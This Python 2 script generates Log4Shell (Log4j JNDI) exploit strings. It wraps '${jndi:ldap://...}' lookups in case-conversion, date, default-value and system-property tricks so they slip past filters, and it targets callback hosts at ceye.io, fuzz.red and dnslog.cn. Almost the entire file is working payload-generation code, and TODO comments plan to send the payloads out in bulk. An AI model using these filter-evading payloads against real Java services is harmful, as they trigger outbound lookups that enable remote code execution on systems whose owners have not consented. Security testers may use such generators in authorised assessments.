#!/usr/bin/env python
# -*- coding:utf-8 -*-

# payload: ${jndi:ldap://8cs6k5.ceye.io/}
### jndi
### protocol : ldap rmi dns iiop ldaps nis corba http nds
### ip:[port]
# dirty data:

# ${lower:j}
# ${env:ENV_NAME:-j}
# ${::-j}
# ${date:}
# ${sys:sun.cpu.isalist}
import copy
import random

Bypass = ["", "date:\'{}\'", "lower:{}", "upper:{}", ":-{}"]
bypass = ["", "date:\'{}\'", "lower:{}", ":-{}"]
SPACE = "${sys:sun.cpu.isalist}"
COLON = "${sys:path.separator}"

protocol = "ldap"
dns = "8cs6k5.ceye.io"

payload = 'jndi:ldap://8cs6k5.ceye.io/'


# TODO
# YAML 文件编写


# 运行 zendata生成数据 保存为txt


# payload 发送


def trans(payload, dns):
    payload_pre = "{}jndi{}".format(payload['jndi_pre'], payload['jndi_suf'])

    # payload url 脏数据
    # payload_suf = "{}{}{}://{}/".format(payload['protocol_pre'], payload['protocol'], payload['protocol_suf'], dns)
    payload_suf = "{}{}{}".format(payload['protocol_pre'], payload['protocol'], payload['protocol_suf'])
    return create(payload_pre, payload_suf)


def create(pre, suf):
    payloads = []
    for i in range(len(Bypass)):
        # print Bypass[i]
        pre_fin = ""
        # print Bypass[i]
        if Bypass[i] == "":

            pre_fin = pre
        else:
            for item in pre:
                pre_fin += "${" + Bypass[i].format(item) + "}"
        for t in range(len(bypass)):
            suf_fin = ""
            if Bypass[t] == "":
                suf_fin = suf
            else:
                for item in suf:
                    suf_fin += "${" + bypass[t].format(item) + "}"
            # print "${" + pre_fin + ":" + suf_fin + "://{{dnsIP}}/}"
            payloads.append("${" + pre_fin + ":" + suf_fin + "://{{dnsIP}}/}")
    temp = []
    # for i in payloads:
    #     temp.append(colon_trans(i))

    for i in payloads:
        temp.append(dirtyData(i))
    payloads.extend(temp)

    # print "payloads test:"
    # for i in payloads:
    #     print i
    return payloads
    # return temp


def colon_trans(payload):
    return payload.replace(":", COLON)


def dirtyData(payload):
    replaceDict = {
        'date': "da${sys:sun.cpu.isalist}te",
        'lower': "low${sys:sun.cpu.isalist}er",
        'upper': "up${sys:sun.cpu.isalist}per"
    }

    for key in replaceDict.keys():
        if key in payload:
            payload = payload.replace(key, replaceDict[key])
    return payload


def test(pre, suf):
    payloads = []
    for i in range(len(Bypass)):
        # print Bypass[i]
        pre_fin = ""
        # print Bypass[i]
        if Bypass[i] == "":

            pre_fin = pre
        else:
            for item in pre:
                pre_fin += "${" + Bypass[i].format(item) + "}"
        for t in range(len(bypass)):
            suf_fin = ""
            if Bypass[t] == "":
                suf_fin = suf
            else:
                for item in suf:
                    suf_fin += "${" + bypass[t].format(item) + "}"
            # print "${" + pre_fin + ":" + suf_fin + "://{{dnsIP}}/}"
            payloads.append("${" + pre_fin + ":" + suf_fin + "/}")


    temp = []
    for i in payloads:
        temp.append(colon_trans(i))

    for i in payloads:
        temp.append(dirtyData(i))
    payloads.extend(temp)

    for i in payloads:
        print i
    return payloads


payloads = test("jndi", "ldap://70to.fuzz.red")



# ${jn${sys:path.separator}di:ld${sys:path.separator}ap://[3miuhv.dnslog.cn]/}